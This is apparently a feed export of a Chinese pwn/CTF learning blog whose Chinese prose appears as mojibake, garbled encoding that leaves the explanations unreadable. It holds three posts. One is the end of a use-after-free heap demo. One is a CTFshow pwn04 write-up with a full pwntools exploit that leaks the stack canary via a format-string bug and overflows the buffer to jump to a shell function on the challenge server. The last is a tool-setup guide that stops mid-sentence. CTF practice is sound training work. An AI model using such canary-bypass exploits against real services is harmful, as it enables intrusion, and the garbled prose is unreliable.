æœ‰äº›å•¥ï¼Ÿ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; heap</span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555559000</span><br><span class="line">Size: 0x290 (with flag bits: 0x291)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555559290</span><br><span class="line">Size: 0x520 (with flag bits: 0x521)</span><br><span class="line"></span><br><span class="line">Allocated chunk | PREV_INUSE</span><br><span class="line">Addr: 0x5555555597b0</span><br><span class="line">Size: 0x260 (with flag bits: 0x261)</span><br><span class="line"></span><br><span class="line">Top chunk | PREV_INUSE</span><br><span class="line">Addr: 0x555555559a10</span><br><span class="line">Size: 0x205f0 (with flag bits: 0x205f1)</span><br></pre></td></tr></table></figure><p>â€‹æ ¹æ®ä¸‹é¢ä¸¤ä¸ªè¾“å‡ºï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ç¬¬ä¸€ä¸ª a = malloc(0x512) åœ¨: 0x5555555592a0</span><br><span class="line">ç¬¬äºŒä¸ª a = malloc(0x256) åœ¨: 0x5555555597c0</span><br></pre></td></tr></table></figure><p>â€‹å¯ä»¥çœ‹å‡ºæ¥ï¼Œä¸Šé¢é‚£ä¸ª heap ç»“æ„ä¸­ï¼Œç¬¬äºŒä¸ªä¸º a æ‰€åœ¨åœ°å€ï¼Œç¬¬ä¸‰ä¸ªä¸º b æ‰€åœ¨åœ°å€ï¼Œä¸ºå•¥ä¸Šä¸‹çœ‹åˆ°çš„åœ°å€ä¸åŒï¼Œè¿™ä¸ªä¸»è¦æ˜¯å’Œ malloc å‡½æ•°è¿”å›æŒ‡é’ˆçš„åœ°å€æœ‰å…³ï¼Œè¿™ä¸ªè¿™å„¿å°±ä¸ç»†è¯´äº†ã€‚</p><p>â€‹åœ¨æŠŠ AAAAAAAA è¿™ä¸ªå­—ç¬¦ä¸²å†™å…¥ a ä¸­ï¼Œæˆ‘ä»¬çœ‹çœ‹ a çš„å†…å­˜å¸ƒå±€ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/10gx 0x555555559290</span><br><span class="line">0x555555559290: 0x0000000000000000      0x0000000000000521</span><br><span class="line">0x5555555592a0: 0x4141414141414141      0x0000000000000000</span><br><span class="line">0x5555555592b0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555555592c0: 0x0000000000000000      0x0000000000000000</span><br><span class="line">0x5555555592d0: 0x0000000000000000      0x0000000000000000</span><br></pre></td></tr></table></figure><p>â€‹å¯ä»¥çœ‹å‡ºæ¥ï¼Œå·²ç»æˆåŠŸå†™å…¥äº†ï¼Œå…ˆ free æ‰ aï¼Œä¹‹å malloc ä¸€ä¸ªæ¯” a å°ä¸€ç‚¹çš„ï¼ŒæŠŠè¿™ä¸ªåœ°å€èµ‹ç»™ cï¼Œå¯ä»¥çœ‹å‡ºï¼Œè¾“å‡ºçš„æ—¶å€™å‘ç° a åŸæœ¬çš„åœ°å€å’Œ c çš„åœ°å€ç›¸ç­‰ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#ç¬¬ä¸€ä¸ª a = malloc(0x512) åœ¨: 0x5555555592a0</span></span><br><span class="line"> ç¬¬ä¸‰æ¬¡ c = malloc(0x500) åœ¨: 0x5555555592a0</span><br></pre></td></tr></table></figure><p>â€‹ä¹‹åå°† CCCCCCCC å†™å…¥ c çš„åœ°å€ï¼Œä¹‹åé€šè¿‡ a å’Œ c è¾“å‡ºè¯•è¯•çœ‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">ç¬¬ä¸‰æ¬¡ç”³è¯·çš„ c 0x5555555592a0 æŒ‡å‘ CCCCCCCC</span><br><span class="line">ç¬¬ä¸€æ¬¡ç”³è¯·çš„ a 0x5555555592a0 æŒ‡å‘ CCCCCCCC</span><br></pre></td></tr></table></figure><p>â€‹å½“é‡Šæ”¾äº†ä¸€å—å†…å­˜ä¹‹åå†å»ç”³è¯·ä¸€ä¸ªå¤§å°ç•¥å°çš„ç©ºé—´ï¼Œé‚£ä¹ˆ glibc å€¾å‘äºå°†å…ˆå‰é‡Šæ”¾çš„ç©ºé—´é‡æ–°åˆ†é…ï¼Œç”±äº a çš„æŒ‡é’ˆæ²¡æœ‰è¢«ç½®é›¶ï¼Œè¿™å°±é€ æˆäº†å¯ä»¥ç›´æ¥é€šè¿‡ a æ¥è®¿é—®å·²ç» free æ‰çš„ chunk å’Œé‡æ–°åˆ†é…å¥½çš„ç•¥å°çš„ chunkï¼Œç”±æ­¤ï¼Œé€ æˆäº† UAF æ¼æ´ã€‚</p>]]></content>
      
      
      <categories>
          
          <category> Pwnæ‰‹çš„è‡ªæˆ‘ä¿®å…» </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Pwnåˆ·é¢˜è®°å½•ï¼ˆä¸åœæ›´æ–°ï¼‰</title>
      <link href="/posts/9b0d93f7.html"/>
      <url>/posts/9b0d93f7.html</url>
      
        <content type="html"><![CDATA[<h2 id="1-ctfshow-pwn04åŸºç¡€canary"><a class="markdownIt-Anchor" href="#1-ctfshow-pwn04åŸºç¡€canary">#</a> 1ã€CTFshow-pwn04ï¼ˆåŸºç¡€ canaryï¼‰</h2><p>â€‹å¥½ä¹…æ²¡ç¢°è¿‡ pwn äº†ï¼Œä»Šå¤©ä¸´æ—¶åšä¸€é“å§ï¼Œæ¯•ç«Ÿåˆšè”åˆäº† WSL å’Œ VSCodeï¼Œæƒ³ç€è¯•ç€åšä¸€é“é¢˜çœ‹çœ‹ï¼Œç»“æœéšæ‰‹ä¸€ç‚¹ï¼Œå°±æ˜¯ä¸€ä¸ªå¾ˆå°‘æ¥è§¦çš„ï¼Œæ‹¿æ¥åˆ·åˆ·ï¼š</p><p>â€‹å…ˆæŸ¥çœ‹ä¸‹ä¿æŠ¤ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">root@MSI:/home/g01den/Temp<span class="comment"># checksec pwn</span></span><br><span class="line">[*] <span class="string">&#x27;/home/g01den/Temp/pwn&#x27;</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure><p>â€‹é™¤äº† NX ä¹‹å¤–ï¼Œä¼¼ä¹å°±åªæœ‰ Canary äº†ã€‚åç¼–è¯‘çœ‹çœ‹ï¼š</p><p>â€‹æœ‰ç”¨çš„åªæœ‰ vuln å‡½æ•°ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+4h] [ebp-74h]</span></span><br><span class="line">  <span class="type">char</span> buf[<span class="number">100</span>]; <span class="comment">// [esp+8h] [ebp-70h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// [esp+6Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">1</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">0x200</span>u);</span><br><span class="line">    <span class="built_in">printf</span>(buf);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>â€‹å‘ç°äº†ä¸ªäº‹å„¿ï¼Œfor å¾ªç¯ä¼šæ‰§è¡Œä¸¤æ¬¡ï¼Œæ‰€ä»¥è¿™é‡Œé‡‡ç”¨ç¬¬ä¸€æ¬¡ä¸æº¢å‡ºï¼Œé€šè¿‡æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´å¯¹ Canary çš„å€¼è¿›è¡Œæ³„éœ²ï¼Œä¹‹åå°±å¯ä»¥åœ¨åˆé€‚çš„åœ°æ–¹å¡«å…¥ canary çš„å€¼æ¥ç»•è¿‡ canary ä¿æŠ¤äº†ã€‚</p><p>â€‹å› æ­¤ï¼Œæ€è·¯å°±å¾ˆæ˜ç¡®äº†ã€‚</p><p>â€‹ä¹‹åé€šè¿‡ disass vuln æŸ¥çœ‹æ±‡ç¼–ä»£ç ï¼Œå‘ç°äº†é‡è¦çš„ä¸€ä¸ªå†…å®¹ï¼Œå®ƒåœ¨ ret ä¹‹å‰è¿›è¡Œäº†ä¸€æ¬¡å¼‚æˆ–ï¼Œä¸”æŒ‡å®šçš„å†…å­˜ä¸º [ebp-0xc]ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">0x08048677 &lt;+73&gt;:    nop</span><br><span class="line">0x08048678 &lt;+74&gt;:    mov    eax,DWORD PTR [ebp-0xc]</span><br><span class="line">0x0804867b &lt;+77&gt;:    xor    eax,DWORD PTR gs:0x14</span><br><span class="line">0x08048682 &lt;+84&gt;:    je     0x8048689 &lt;vuln+91&gt;</span><br><span class="line">0x08048684 &lt;+86&gt;:    call   0x8048450 &lt;__stack_chk_fail@plt&gt;</span><br><span class="line">0x08048689 &lt;+91&gt;:    leave  </span><br><span class="line">0x0804868a &lt;+92&gt;:    ret </span><br></pre></td></tr></table></figure><p>â€‹ç”±æ­¤å¯çŸ¥ï¼Œcannary å­˜æ”¾çš„åœ°å€å°±æ˜¯ [ebp-0xc]ï¼Œçœ‹ä¸€ä¸‹ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">1f:007câ”‚-00c 0xffffd56c â—‚â€” 0x7493ea00</span><br><span class="line">20:0080â”‚-008 0xffffd570 â€”â–¸ 0x8048768 â—‚â€” dec eax /* <span class="string">&#x27;Hello Hacker!&#x27;</span> */</span><br><span class="line">21:0084â”‚-004 0xffffd574 â—‚â€” 0xa0000</span><br><span class="line">22:0088â”‚ ebp 0xffffd578 â€”â–¸ 0xffffd598 â—‚â€” 0</span><br></pre></td></tr></table></figure><p>â€‹ç›®æµ‹ cannary çš„å€¼ä¸º 0x7493ea00ï¼Œé‚£ä¹ˆï¼Œ æƒ³è¦æ³„éœ²è¿™ä¸ªå€¼ï¼Œéœ€è¦ä½¿ç”¨æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¥æ³„éœ²ï¼Œé‚£ä¹ˆï¼Œæ¥åˆ¤æ–­ä¸‹å¯¹ä¸å¯¹å§ï¼Œæˆ‘ä»¬è¾“å…¥ %31$x å³å¯æ³„éœ²ï¼š</p><p><img data-src="https://img-blog.csdnimg.cn/direct/da9f516fdace47a5a69b947210919c38.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>â€‹æ ¹æ®è¿™ä¿©è¿›è¡Œè®¡ç®—ï¼Œå¯å¾—åˆ°åç§»ï¼Œç»“æœæ˜¯ 0x7c/4=31ã€‚</p><p>â€‹ä¹‹åå°±æ˜¯å…·ä½“è¿›è¡Œæº¢å‡ºäº†ï¼Œè®¡ç®—æº¢å‡ºçš„é•¿åº¦ä¹Ÿæ¯”è¾ƒç®€å•ï¼Œè¿™é‡Œç›´æ¥ä¸Šç­”æ¡ˆå§ï¼Œ116 å­—èŠ‚ï¼Œä¸è¿‡ï¼Œç¬¬ 100 åˆ° 104 ä¸º canary çš„å€¼ã€‚</p><p>â€‹ç”±äºå­˜åœ¨åé—¨å‡½æ•°ï¼Œæ‰€ä»¥ exp å¦‚ä¸‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"> </span><br><span class="line"><span class="comment">#context.terminal = [&quot;tmux&quot;, &quot;splitw&quot;, &quot;-h&quot;]</span></span><br><span class="line">Locale = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> Locale == <span class="number">1</span>:</span><br><span class="line">    io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = remote(<span class="string">&#x27;pwn.challenge.ctf.show&#x27;</span>,<span class="number">28203</span>)</span><br><span class="line"> </span><br><span class="line">context(arch=<span class="string">&#x27;i386&#x27;</span>, os=<span class="string">&#x27;linux&#x27;</span>, log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recv()</span><br><span class="line">payload1 = <span class="string">b&quot;%31$x&quot;</span></span><br><span class="line">io.sendline(payload1)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(io.recvuntil(<span class="string">b&#x27;\n&#x27;</span>),<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">getshell_addr = <span class="number">0x0804859B</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span>*<span class="number">100</span> + p32(canary) + <span class="string">b&#x27;a&#x27;</span>*<span class="number">12</span> + p32(getshell_addr)</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Pwnæ‰‹çš„è‡ªæˆ‘ä¿®å…» </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pwnå­¦ä¹ ç¬”è®°ï¼ˆ0ï¼‰-äº‹åè¡¥å……</title>
      <link href="/posts/d7e2e20f.html"/>
      <url>/posts/d7e2e20f.html</url>
      
        <content type="html"><![CDATA[<h1 id="pwnç¯å¢ƒéƒ¨ç½²"><a class="markdownIt-Anchor" href="#pwnç¯å¢ƒéƒ¨ç½²">#</a> Pwn ç¯å¢ƒéƒ¨ç½²ï¼š</h1><h2 id="1-èƒŒæ™¯"><a class="markdownIt-Anchor" href="#1-èƒŒæ™¯">#</a> 1ã€èƒŒæ™¯ï¼š</h2><p>â€‹é¦–å…ˆæ˜¯åœ¨æœ€å¼€å§‹çš„æ—¶å€™è£…ç¯å¢ƒæ­¤æ¬¡ç¢°å£ï¼Œæå¾—æ²¡å¿ƒæ€å†™è¿™ç¯‡åšå®¢ï¼Œå…¶æ¬¡ï¼Œåˆå› ä¸ºè™šæ‹Ÿæœºæœ¬èº«çš„é—®é¢˜ï¼Œå¯¼è‡´æˆ‘å¯¹è™šæ‹Ÿæœºæœ‰å¾ˆå¼ºçš„ä¸æ»¡ï¼Œæ‰€ä»¥æˆ‘æœ€å¼€å§‹æ²¡æœ‰å†™è¿™ç¯‡åšå®¢ï¼Œä½†æ˜¯ï¼Œè½¬å¿µä¸€æƒ³ï¼Œä¸ºä»€ä¹ˆæˆ‘å¿…é¡»å¾—æ‰§ç€äº è™šæ‹Ÿæœºå‘¢ï¼Ÿä¸æ˜¯åŒæ ·éƒ½æ˜¯ Linux å—ï¼Œä¸ºå•¥æˆ‘ä¸ç›´æ¥é‡‡ç”¨ WSL æ¥éƒ¨ç½² Pwn ç¯å¢ƒå‘¢ï¼Ÿæ‰€ä»¥ï¼Œè¿™é‡Œæˆ‘é€‰æ‹©äº†é‡è£…äº†ä¸‹ Pwn ç¯å¢ƒï¼Œä¸è¿‡ï¼Œå› ä¸ºæˆ‘è£…å¥½å¾ˆå¤§ä¸€éƒ¨åˆ†ä¹‹åæ‰æƒ³èµ·æ¥è®°å½•åšå®¢ï¼Œæ‰€ä»¥æˆ‘åªä¼šæŠŠå‰é¢çš„å†…å®¹ç®€å•è®°å½•ä¸€ä¸‹ï¼Œä¸è¿›è¡ŒäºŒæ¬¡å®æ“äº†ã€‚</p><p>â€‹WSL çš„å®‰è£…æˆ‘å°±ä¸è¯¦ç»†è¿›è¡Œè¯´æ˜äº†ï¼Œè¿™ä¸ªæŒºæ— è„‘çš„ã€‚</p><h2 id="2-åŸºç¡€å·¥å…·"><a class="markdownIt-Anchor" href="#2-åŸºç¡€å·¥å…·">#</a> 2ã€åŸºç¡€å·¥å…·ï¼š</h2><h3 id="1vim"><a class="markdownIt-Anchor" href="#1vim">#</a> &lt;1&gt;Vimï¼š</h3><p>â€‹æˆ‘æƒ³ï¼Œå¤§éƒ¨åˆ†çš„ Ubuntu ä¼¼ä¹éƒ½å·²ç»è£…å¥½äº†ï¼Œä¸è¿‡ä¼¼ä¹å¬è¯´æœ‰çš„æ²¡æœ‰ï¼Œä¸è¿‡è´´ä¸€ä¸ªæºç è¿‡æ¥ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install vim</span><br></pre></td></tr></table></figure><h3 id="2git"><a class="markdownIt-Anchor" href="#2git">#</a> &lt;2&gt;gitï¼š</h3><p>â€‹è€æ ·å­ï¼Œä¸€æŠŠæ¢­</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install git</span><br></pre></td></tr></table></figure><h3 id="3gcc"><a class="markdownIt-Anchor" href="#3gcc">#</a> &lt;3&gt;GCCï¼š</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install gcc</span><br></pre></td></tr></table></figure><h3 id="4python3-pip"><a class="markdownIt-Anchor" href="#4python3-pip">#</a> &lt;4&gt;python3-pipï¼š</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install python3-pip</span><br></pre></td></tr></table></figure><h3 id="5qemu"><a class="markdownIt-Anchor" href="#5qemu">#</a> &lt;5&gt;qemuï¼š</h3><p>â€‹QEMU æ˜¯ä¸€å¥—ç”±æ³•å¸ƒé‡Œæ–¯ãƒ»è´æ‹‰ (Fabrice Bellard) æ‰€ç¼–å†™çš„ä»¥ GPL è®¸å¯è¯åˆ†å‘æºç çš„æ¨¡æ‹Ÿå¤„ç†å™¨ï¼Œåœ¨ GNU/Linux å¹³å°ä¸Šä½¿ç”¨å¹¿æ³›ï¼Œä¸ªäººæ„Ÿè§‰è¿˜å¯ä»¥ä½†æ˜¯ä¾æ—§æ²¡æœ‰åµç”¨ï¼Œç…§æ ·ç”¨å‘½ä»¤ä¸€æŠŠæ¢­å“ˆ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install qemu-user qemu-system</span><br></pre></td></tr></table></figure><h3 id="6gdb-multiarch"><a class="markdownIt-Anchor" href="#6gdb-multiarch">#</a> &lt;6&gt;gdb-multiarchï¼š</h3><p>â€‹ç”¨ä½œ gdb å®¢æˆ·ç«¯è¿›è¡Œè°ƒè¯•ï¼Œæ˜¯ä»»ä½•æ¶æ„çš„é€šç”¨å®¢æˆ·ç«¯</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get install gdb-multiarch</span><br></pre></td></tr></table></figure><h2 id="3-pwnå·¥å…·"><a class="markdownIt-Anchor" href="#3-pwnå·¥å…·">#</a> 3ã€Pwn å·¥å…·ï¼š</h2><h3 id="1pwntools-checksec-rop_gadget"><a class="markdownIt-Anchor" href="#1pwntools-checksec-rop_gadget">#</a> &lt;1&gt;pwntoolsã€checksecã€ROP_gadgetï¼š</h3><p>â€‹æˆ‘é‡‡ç”¨çš„æ˜¯ python3ï¼Œæ‰€ä»¥ä½¿ç”¨ï¼Œè¿™ä¸‰ä¸ªå·¥å…·ä¼¼ä¹ç›´æ¥å°±é€šè¿‡è¿™ä¸ªå‘½ä»¤ä¸€èµ·å®‰è£…äº†ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip3 install pwntools -i https://pypi.tuna.tsinghua.edu.cn/simple</span><br></pre></td></tr></table></figure><h3 id="2pwndbgpedagef"><a class="markdownIt-Anchor" href="#2pwndbgpedagef">#</a> &lt;2&gt;Pwndbgï¼Œpedaï¼Œgefï¼š</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com/pwndbg/pwndbg.git</span><br><span class="line">//ä¸‹é¢ä¸¤ä¸ªæ˜¯å¯é€‰çš„</span><br><span class="line"><span class="comment">#git clone https://github.com/longld/peda.git</span></span><br><span class="line"><span class="comment">#git clone https://github.com/hugsy/gef.git</span></span><br></pre></td></tr></table></figure><p>â€‹æˆ‘åœ¨è¿™é‡ŒæˆåŠŸçŒœäº†ä¸ªå‘ï¼Œä¸çŸ¥é“ä¸ºå•¥ï¼Œç°åœ¨æƒ³è¦å®‰è£… pwndbg çš„æ—¶å€™å‡ºç°äº†ä¸€ä¸ªå¾ˆæ¶å¿ƒçš„é—®é¢˜ï¼Œå°±æ˜¯è¦å®‰è£…ä¸€ä¸ª Poetry çš„ä¸œè¥¿ï¼Œè¿™ä¸ªå¾ˆæ¶å¿ƒäººï¼Œé‡åˆ°äº†ä¸ªæ¢æºæ‰èƒ½è§£å†³çš„é—®é¢˜ï¼Œæ²¡é”™ï¼Œæˆ‘é­”æ³•ä¸Šç½‘éƒ½æ²¡ç”¨çš„æ¶å¿ƒäººçš„é—®é¢˜ã€‚ä¾æ¬¡æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pip config <span class="built_in">set</span> global.index-url https://pypi.tuna.tsinghua.edu.cn/simple</span><br><span class="line"><span class="built_in">cd</span> pwndbg</span><br><span class="line">./setup.sh</span><br></pre></td></tr></table></figure><p>â€‹å®‰è£…çš„é€Ÿåº¦å¾ˆæ…¢ï¼Œéœ€è¦è€å¿ƒç­‰å¾…ã€‚å¦‚æœåªå®‰è£…ä¸€ä¸ª pwndbg çš„è¯ï¼Œé‚£ä¹ˆåœ¨æ‰§è¡Œå®Œ ./setup.sh ä¹‹åå°±å¯ä»¥ä¸ç”¨è¿›è¡Œåç»­æ“ä½œäº†ã€‚</p><p>â€‹ä¹‹åå®‰è£…æ’ä»¶ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo pip install keystone-engine ropper keystone-engine</span><br></pre></td></tr></table></figure><p>â€‹åœ¨ä¿®æ”¹ä¸‹é¢çš„æ–‡ä»¶ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo vim ~/.gdbinit</span><br></pre></td></tr></table></figure><p>â€‹æŠŠä¸‹é¢çš„å†…å®¹ç²˜è´´è¿›å»ï¼š</p><figure class="highlight tex"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="params">##</span> vimååœ¨æ–‡ä»¶å†…è¾“å…¥ä¸‹æ–¹æ¨ªçº¿ä¸­å†…å®¹ï¼Œé€‰æ‹©ä¸‰ä¸ªæ’ä»¶å…¶ä¸­ä¸€ä¸ªï¼Œå¦å¤–ä¸¤ä¸ªæ³¨é‡Šæ‰ï¼Œä¿å­˜é€€å‡º</span><br><span class="line">-------------------------------------------------------------------------</span><br><span class="line">source /home/hollk/tools/pwndbg/gdbinit.py</span><br><span class="line"><span class="params">#</span>source /home/hollk/tools/peda/peda.py</span><br><span class="line"><span class="params">#</span>source /home/hollk/tools/gef-dev/gef.py</span><br><span class="line">-------------------------------------------------------------------------</span><br></pre></td></tr></table></figure><h3 id="3one_gadget"><a class="markdownIt-Anchor" href="#3one_gadget">#</a> &lt;3&gt;one_gadgetï¼š</h3><p>â€‹åœ¨ ctf-pwn ä¸­å¤§éƒ¨åˆ†æƒ…å†µéœ€è¦è·å¾—è¿œç¨‹ shellï¼Œone_gadget ä¼šè‡ªåŠ¨æŸ¥æ‰¾ ELF æ–‡ä»¶ä¸­çš„ execve (â€˜/bin/shâ€™, NULL, NULL)ï¼Œé€šè¿‡ exploit å®ç° RCEï¼ˆè¿œç¨‹ä»£ç æ‰§è¡Œï¼‰</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install -y ruby ruby-dev</span><br><span class="line">sudo gem install one_gadget</span><br></pre></td></tr></table></figure><h3 id="4seccomp-tools"><a class="markdownIt-Anchor" href="#4seccomp-tools">#</a> &lt;4&gt;seccomp-toolsï¼š</h3><p>â€‹åˆ†ææ²™ç›’çš„å·¥å…·ï¼š</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo gem install seccomp-tools</span><br></pre></td></tr></table></figure><h3 id="5libcsearcher"><a class="markdownIt-Anchor" href="#5libcsearcher">#</a> &lt;5&gt;LibcSearcherï¼š</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://github.com.cnpmjs.org/lieanu/LibcSearcher.git</span><br><span class="line"><span class="built_in">cd</span> LibcSearcher</span><br><span class="line">sudo python3 setup.py install</span><br></pre></td></tr></table></figure><h3 id="6patchelf"><a class="markdownIt-Anchor" href="#6patchelf">#</a> &lt;6&gt;patchelf</h3><p>â€‹PatchELF æ˜¯ä¸€ä¸ªç”¨äºä¿®æ”¹ç°æœ‰ ELF å¯æ‰§è¡Œæ–‡ä»¶å’Œåº“çš„ç®€å•å®ç”¨ç¨‹åº</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install patchelf</span><br></pre></td></tr></table></figure><h2 id="4-vscodeä¸wsl"><a class="markdownIt-Anchor" href="#4-vscodeä¸wsl">#</a> 4ã€VSCode ä¸ WSL</h2><p>â€‹é¦–å…ˆï¼Œéœ€è¦ä¸‹è½½ä¸€ä¸ª VSCodeï¼Œç„¶åä¸‹è½½ WSL æ’ä»¶ï¼Œä¹‹åï¼Œåœ¨å·¦ä¸‹è§’æ–°å»ºè¿æ¥çš„æ—¶å€™ï¼Œåœ¨ä¸Šæ–¹ä¸­é—´é€‰æ‹©ç”¨å‘è¡Œç‰ˆè¿æ¥ WSLï¼Œä¹‹ååœ¨å·¦è¾¹èµ„æºç®¡ç†å™¨é€‰æ‹©æ–‡ä»¶å¤¹ï¼Œé€‰æ‹©æˆ‘ä»¬çš„ home 